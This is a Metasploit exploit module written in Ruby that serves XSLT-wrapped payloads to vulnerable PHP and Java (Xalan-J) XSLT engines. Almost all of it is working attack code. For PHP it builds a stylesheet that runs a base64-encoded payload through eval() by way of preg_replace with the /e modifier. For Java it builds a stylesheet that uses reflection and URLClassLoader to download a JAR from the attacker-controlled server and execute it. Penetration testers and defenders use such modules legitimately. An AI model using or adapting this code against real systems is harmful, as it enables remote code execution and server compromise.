###
#
# This module exploits PHP or Java applications by acting as an HTTP server
# hosting XSLT-wrapped payloads for Arbitrary XSLT Execution vulnerabilities
#
###

class Metasploit4 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Generic XSLT+PHP Code Execution',
			'Description'    => %q{
				This module is a generic payload provider for exploitation of
				PHP and Java XSLT engines. For PHP, RegisterPhpFunctions() must
				be called. Under Java, only Xalan-J was tested.
				Note: the vulnerability itself should be triggered manually.
			},
			'Author'	=> 
				[
					'Nicolas "Nicob" Gregoire',	# This code
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://xhe.myxwiki.org/xwiki/bin/view/XSLT/Application_PHP5' ],
					[ 'URL', 'http://xhe.myxwiki.org/xwiki/bin/view/XSLT/Engine_XalanJ' ],
				],
			'Privileged'	=> false,
			'Payload'       => { 'BadChars' => '', 'DisableNops' => true },
			'Stance'	=> Msf::Exploit::Stance::Aggressive,
			'Targets'	=>
				[
					[ 'PHP',
						{
							'Arch'      => ARCH_PHP,
							'Platform'  => 'php'
						}
					],
					[ 'Java',
						{
							'Arch'      => ARCH_JAVA,
							'Platform'  => 'java'
						}
					],
				],
			'DisclosureDate' => 'January 16, 2012', # First PoC on my Wiki
			'DefaultTarget'  => 1))
		
	end

	# Handle an incoming request
	def on_request_uri(cli, request, headers={})
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Answer the request
		if (target == targets[0])
			# PHP
			send_php_xsl(cli, p, headers)
		else
			# Java
			if request.uri =~ /\.xsl$/
				# Send the XSL if explicitly asked
				send_java_xsl(cli, headers)
			elsif request.uri =~ /\.jar$/
				# Send the JAR if explicitly asked
				send_java_jar(cli, p, headers)
			else
				print "Unsupported extension. Try '.xsl' ..."
			end
		end
	end

	# Send the Java payload in a JAR
	def send_java_jar(cli, java, headers = {})

		jar = java.encoded_jar
		jar.add_file("#{rand_text_alphanumeric(8 + rand(8))}.class", @applet_class)
		jar.build_manifest(:main_class => "metasploit.Payload")

		send_response( cli, jar.to_s, { 'Content-Type' => "application/octet-stream" } )
	end

	# Send a XSLT-wrapped JAR loader
	def send_java_xsl(cli, headers = {})

		jar_url = get_uri() + '/' + rand_text_alpha(8) + '.jar'

		xsl =  "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:j=\"http://xml.apache.org/xalan/java\" exclude-result-prefixes=\"j\">\n"
		xsl << "<xsl:template match=\"/\">\n"
		xsl << "<xsl:variable name=\"url\">#{jar_url}</xsl:variable>\n"
		xsl << "<xsl:variable name=\"arrays\">rO0ABXVyAA9bTGphdmEubmV0LlVSTDtSUf0kxRtozQIAAHhwAAAAAXB1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAAA</xsl:variable>\n"
		xsl << "<xsl:variable name=\"ois\" select=\"j:java.io.ObjectInputStream.new(j:java.io.ByteArrayInputStream.new(j:decodeBuffer(j:sun.misc.BASE64Decoder.new(),$arrays)))\" />\n"
		xsl << "<xsl:variable name=\"n\" select=\"j:get(j:java.util.HashMap.new(),'')\"/>\n"
		xsl << "<xsl:variable name=\"c1\" select=\"j:getInterfaces(j:java.lang.Class.forName('java.lang.Number'))\"/>\n"
		xsl << "<xsl:variable name=\"c2\" select=\"j:getInterfaces(j:java.lang.Class.forName('java.io.File'))\"/>\n"
		xsl << "<xsl:variable name=\"l\" select=\"j:java.util.ArrayList.new()\"/>\n"
		xsl << "<xsl:variable name=\"urlarray\" select=\"j:readObject($ois)\"/>\n"
		xsl << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($urlarray,0,j:java.net.URL.new($url))\"/>\n"
		xsl << "<xsl:value-of select=\"substring(j:add($l,$urlarray),5)\"/>\n"
		xsl << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c1,0,j:java.lang.Class.forName('[Ljava.net.URL;'))\"/>\n"
		xsl << "<xsl:variable name=\"r\" select=\"j:newInstance(j:getConstructor(j:java.lang.Class.forName('java.net.URLClassLoader'),$c1),j:toArray($l))\"/>\n"
		xsl << "<xsl:value-of select=\"j:clear($l)\"/>\n"
		xsl << "<xsl:value-of select=\"substring(j:add($l,'metasploit.Payload'),5)\"/>\n"
		xsl << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c1,0,j:java.lang.Class.forName('java.lang.String'))\"/>\n"
		xsl << "<xsl:variable name=\"z\" select=\"j:invoke(j:getMethod(j:java.lang.Class.forName('java.lang.ClassLoader'),'loadClass',$c1),$r,j:toArray($l))\"/>\n"
		xsl << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c1,0,j:java.lang.Class.forName('[Ljava.lang.String;'))\"/>\n"
		xsl << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c2,0,j:java.lang.Class.forName('java.lang.String'))\"/>\n"
		xsl << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c2,1,j:java.lang.Class.forName('[Ljava.lang.Class;'))\"/>\n"
		xsl << "<xsl:value-of select=\"j:clear($l)\"/>\n"
		xsl << "<xsl:value-of select=\"substring(j:add($l,'main'),5)\"/>\n"
		xsl << "<xsl:value-of select=\"substring(j:add($l,$c1),5)\"/>\n"
		xsl << "<xsl:variable name=\"v\" select=\"j:invoke(j:getMethod(j:java.lang.Class.forName('java.lang.Class'),'getMethod',$c2),$z,j:toArray($l))\"/>\n"
		xsl << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c2,0,j:java.lang.Class.forName('java.lang.Object'))\"/>\n"
		xsl << "<xsl:value-of select=\"j:java.lang.reflect.Array.set($c2,1,j:java.lang.Class.forName('[Ljava.lang.Object;'))\"/>\n"
		xsl << "<xsl:value-of select=\"j:clear($l)\"/>\n"
		xsl << "<xsl:value-of select=\"substring(j:add($l,j:readObject($ois)),5)\"/>\n"
		xsl << "<xsl:value-of select=\"j:close($ois)\" />\n"
		xsl << "<xsl:value-of select=\"substring(j:set($l,0,j:toArray($l)),1,0)\"/>\n"
		xsl << "<xsl:value-of select=\"j:add($l,0,$n)\"/>\n"
		xsl << "<xsl:value-of select=\"j:invoke(j:getMethod(j:java.lang.Class.forName('java.lang.reflect.Method'),'invoke',$c2),$v,j:toArray($l))\"/>\n"
		xsl << "<result>Test Complete!</result>\n"
		xsl << "</xsl:template>\n"
		xsl << "</xsl:stylesheet>\n"

		send_response( cli, xsl, { 'Content-Type' => "application/octet-stream" } )
	end

	# Send a XSLT-wrapped PHP payload
	def send_php_xsl(cli, php, headers = {})

		xsl =  "<xsl:stylesheet version=\"1.0\"\n"
		xsl << "\txmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n"
		xsl << "\txmlns:php=\"http://php.net/xsl\">\n\n"
		xsl << "\t<xsl:template match=\"/\">\n"
		xsl << "\t\t<xsl:variable name=\"eval\">\n"
		xsl << "\t\t\teval(base64_decode('HERE_HERE_HERE'))\n"
		xsl << "\t\t</xsl:variable>\n"
		xsl << "\t\t<xsl:variable name=\"preg\" select=\"php:function('preg_replace', '/.*/e', $eval, '')\"/>\n"
		xsl << "\t</xsl:template>\n</xsl:stylesheet>\n"
		xsl.gsub!(/HERE_HERE_HERE/, Rex::Text.encode_base64(php.raw))

		send_response( cli, xsl, { 'Content-Type' => "application/octet-stream" } )
	end
end
